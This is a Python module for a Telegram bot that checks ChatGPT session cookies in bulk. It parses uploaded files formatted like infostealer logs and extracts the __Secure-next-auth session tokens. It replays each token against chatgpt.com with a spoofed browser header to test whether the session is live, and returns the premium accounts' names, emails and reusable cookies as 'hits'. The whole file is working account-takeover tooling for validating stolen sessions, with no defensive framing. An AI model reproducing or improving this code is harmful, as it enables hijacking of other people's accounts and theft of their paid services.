# ============================================================
# CHATGPT COOKIE CHECKER SERVICE
# ============================================================

import re
import json
import html
import requests
from io import BytesIO
from datetime import datetime

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from telegram.ext import ContextTypes, ConversationHandler

from config import E
from utils import pe, update_bot_stats


WAITING_CHATGPT_FILE = 9
CHATGPT_EMOJI = "6134246530380472478"


def cg_extract_session_data(html_content):
    pattern = r'<script[^>]*id="client-bootstrap"[^>]*>(.*?)</script>'
    match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
    if match:
        try:
            json_text = match.group(1).strip()
            if '&quot;' in json_text or '&lt;' in json_text:
                json_text = html.unescape(json_text)
            return json.loads(json_text)
        except json.JSONDecodeError:
            return None
    return None


def cg_process_content(content):
    data = cg_extract_session_data(content)
    if not data:
        return None
    auth_status = data.get('authStatus', 'unknown')
    session = data.get('session', {})
    user = session.get('user', {})
    account = session.get('account', {})
    return {
        'status': auth_status,
        'name': user.get('name', 'Unknown'),
        'email': user.get('email', 'Not available'),
        'expiration': session.get('expires', 'Not available'),
        'plan': account.get('planType', 'free'),
        'provider': user.get('idp', 'unknown'),
        'id': user.get('id', 'Not available'),
    }


def cg_extract_cookie_blocks(file_content):
    blocks = []
    lines = file_content.replace('\r\n', '\n').replace('\r', '\n').split('\n')
    current_block = []
    inside_block = False
    separator_pattern = re.compile(r'^#-+#$')
    for line in lines:
        line = line.rstrip()
        if separator_pattern.match(line):
            if inside_block and current_block:
                blocks.append('\n'.join(current_block))
            current_block = [line]
            inside_block = True
        elif inside_block:
            current_block.append(line)
    if inside_block and current_block:
        blocks.append('\n'.join(current_block))
    return blocks


def cg_find_cookies_in_block(block):
    cookie_0 = None
    cookie_1 = None
    user_info = {'username': None, 'browser': None, 'path': None, 'total_cookies': None}
    lines = block.split('\n')
    for line in lines[:10]:
        match_user = re.search(r'@([A-Za-z0-9_\-\.]+)', line)
        if match_user:
            user_info['username'] = match_user.group(1)
        match_browser = re.search(r'/([^/]+)\.txt', line)
        if match_browser:
            user_info['browser'] = match_browser.group(1)
        match_count = re.search(r'(\d+) cookie\(s\) found', line)
        if match_count:
            user_info['total_cookies'] = match_count.group(1)
    for line in lines:
        if '__Secure-next-auth.session-token.0' in line:
            parts = line.strip().split('\t')
            if len(parts) >= 7:
                cookie_0 = parts[6].strip()
        elif '__Secure-next-auth.session-token.1' in line:
            parts = line.strip().split('\t')
            if len(parts) >= 7:
                cookie_1 = parts[6].strip()
        elif '__Secure-next-auth.session-token' in line and '.0' not in line and '.1' not in line:
            parts = line.strip().split('\t')
            if len(parts) >= 7:
                token_value = parts[6].strip()
                if token_value and len(token_value) > 100:
                    cookie_0 = token_value
                    cookie_1 = "OLD_FORMAT"
    return cookie_0, cookie_1, user_info


def cg_test_session(cookie_0, cookie_1):
    if not cookie_0 or not cookie_1:
        return None
    if cookie_1 == "OLD_FORMAT":
        cookies = f"__Secure-next-auth.session-token={cookie_0}"
    else:
        cookies = f"__Secure-next-auth.session-token.0={cookie_0}; __Secure-next-auth.session-token.1={cookie_1}"
    url = "https://chatgpt.com"
    headers = {
        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        'Accept-Language': "en-US,en;q=0.9",
        'Upgrade-Insecure-Requests': "1",
        'Cookie': cookies,
    }
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return cg_process_content(response.text)
    except Exception:
        return None


def cg_format_cookie_netscape(cookie_name, cookie_value):
    return f".chatgpt.com\tTRUE\t/\tTRUE\t1779512917\t{cookie_name}\t{cookie_value}"


def cg_cancel_button():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton(
            f"{pe(E['cross'])} Cancel",
            callback_data="main_menu",
            icon_custom_emoji_id=E['cross']
        )
    ]])


def cg_back_button():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton(
            f"{pe(E['prev'])} Back",
            callback_data="main_menu",
            icon_custom_emoji_id=E['prev']
        )
    ]])


def cg_fmt_premium(r):
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {pe(CHATGPT_EMOJI)} <b>CHATGPT PREMIUM HIT!</b>  ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{pe(E['user'])}  <b>Name     :</b> <code>{r.get('name','Unknown')}</code>\n"
        f"{pe(E['link'])}  <b>Email    :</b> <code>{r.get('email','Unknown')}</code>\n"
        f"{pe(E['gem'])}  <b>Plan     :</b> <code>{r.get('plan','Unknown')}</code>\n"
        f"{pe(E['hourglass'])}  <b>Expires  :</b> <code>{r.get('expiration','Unknown')}</code>\n"
        f"{pe(E['globe'])}  <b>Provider :</b> <code>{r.get('provider','Unknown')}</code>\n"
        f"{pe(E['bolt'])}  <b>Username :</b> <code>{r.get('username','N/A')}</code>\n"
        f"{pe(E['star'])}  <b>File     :</b> <code>{r.get('filename','?')}</code>"
    )


def cg_fmt_summary(premium, free, dead, total, elapsed):
    pct = f"{premium / total * 100:.1f}" if total else "0.0"
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {pe(CHATGPT_EMOJI)} <b>CHATGPT CHECK COMPLETE</b>  ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{pe(E['dice'])} Total    : <b>{total}</b>\n"
        f"{pe(E['gem'])} Premium  : <b>{premium}</b>  (<i>{pct}% hit rate</i>)\n"
        f"{pe(E['cross'])} Free     : <b>{free}</b>\n"
        f"{pe(E['warn'])} Dead     : <b>{dead}</b>\n"
        f"{pe(E['hourglass'])} Time     : <b>{elapsed:.1f}s</b>"
    )


def cg_fmt_progress(done, total, premium, free, dead, last=None):
    pct = done / total if total else 0
    filled = int(pct * 10)
    bar = "█" * filled + "░" * (10 - filled)
    preview = ""
    if last and last.get("status") == "PREMIUM":
        preview = (
            f"\n━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{pe(CHATGPT_EMOJI)} <b>Latest Premium:</b>\n"
            f"  {pe(E['link'])} {last.get('email', 'Unknown')}\n"
            f"  {pe(E['gem'])} {last.get('plan', 'Unknown')}\n"
        )
    return (
        f"{pe(CHATGPT_EMOJI)} <b>ChatGPT Checker</b> — Running\n\n"
        f"<code>[{bar}]  {int(pct * 100)}%</code>\n\n"
        f"{pe(E['gem'])} Premium : <b>{premium}</b>\n"
        f"{pe(E['cross'])} Free    : <b>{free}</b>\n"
        f"{pe(E['warn'])} Dead    : <b>{dead}</b>\n"
        f"{pe(E['star'])} Checked : <b>{done}</b> / <b>{total}</b>"
        f"{preview}"
    )


async def cg_start_handler(update, context):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"{pe(CHATGPT_EMOJI)} <b>ChatGPT Cookie Checker</b>\n\n"
        f"{pe(E['next'])} Upload a <b>.txt</b> file with ChatGPT cookies\n"
        f"{pe(E['bolt'])} (Netscape format with __Secure-next-auth.session-token)\n\n"
        f"{pe(E['star'])} I will check each session and extract premium accounts.",
        reply_markup=cg_cancel_button(),
        parse_mode="HTML"
    )
    return WAITING_CHATGPT_FILE


async def cg_handle_file(update, context):
    document = update.message.document
    if not document:
        await update.message.reply_html(
            f"{pe(E['cross'])} Please upload a file.",
            reply_markup=cg_cancel_button()
        )
        return WAITING_CHATGPT_FILE

    status_msg = await update.message.reply_html(
        f"{pe(E['loading'])} Processing file..."
    )

    try:
        file = await document.get_file()
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        blocks = cg_extract_cookie_blocks(text)
        if not blocks:
            await status_msg.edit_text(
                f"{pe(E['cross'])} No cookie blocks found in file.",
                reply_markup=cg_back_button()
            )
            return ConversationHandler.END

        total = len(blocks)
        premium = []
        free = []
        dead = []
        last = None

        for i, block in enumerate(blocks):
            cookie_0, cookie_1, user_info = cg_find_cookies_in_block(block)
            if not (cookie_0 and cookie_1):
                continue
            result = cg_test_session(cookie_0, cookie_1)
            if result:
                plan = result.get('plan', 'free').lower()
                if plan == 'free':
                    free.append(result)
                else:
                    result['user_info'] = user_info
                    result['cookie_0'] = cookie_0
                    result['cookie_1'] = cookie_1
                    result['filename'] = document.file_name or 'file'
                    premium.append(result)
                    last = result
                    await update.message.reply_html(cg_fmt_premium(result))
            else:
                dead.append({"status": "DEAD", "filename": document.file_name or 'file'})

            if (i + 1) % 3 == 0 or i == total - 1:
                try:
                    await status_msg.edit_text(
                        cg_fmt_progress(i + 1, total, len(premium), len(free), len(dead), last),
                        reply_markup=cg_back_button()
                    )
                except Exception:
                    pass

        if premium:
            buf = BytesIO()
            for i, hit in enumerate(premium, 1):
                buf.write(f"========== HIT #{i} ==========\n".encode())
                buf.write(f"Name    : {hit.get('name', 'Unknown')}\n".encode())
                buf.write(f"Email   : {hit.get('email', 'Unknown')}\n".encode())
                buf.write(f"Plan    : {hit.get('plan', 'Unknown')}\n".encode())
                buf.write(f"Expires : {hit.get('expiration', 'Unknown')}\n".encode())
                buf.write(f"Provider: {hit.get('provider', 'Unknown')}\n\n".encode())
                c0 = cg_format_cookie_netscape("__Secure-next-auth.session-token.0", hit['cookie_0'])
                c1 = cg_format_cookie_netscape("__Secure-next-auth.session-token.1", hit['cookie_1'])
                buf.write(f"{c0}\n{c1}\n\n".encode())
            buf.seek(0)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            await update.message.reply_document(
                InputFile(buf, filename=f"chatgpt_hits_{ts}.txt"),
                caption=f"{pe(CHATGPT_EMOJI)} {len(premium)} premium ChatGPT accounts found!"
            )
            update_bot_stats(True)
        else:
            update_bot_stats(False)

        await status_msg.edit_text(
            cg_fmt_summary(len(premium), len(free), len(dead), total, 0.0),
            reply_markup=cg_back_button()
        )

    except Exception as e:
        await status_msg.edit_text(
            f"{pe(E['cross'])} Error: {str(e)[:200]}",
            reply_markup=cg_back_button()
        )
        update_bot_stats(False)

    return ConversationHandler.END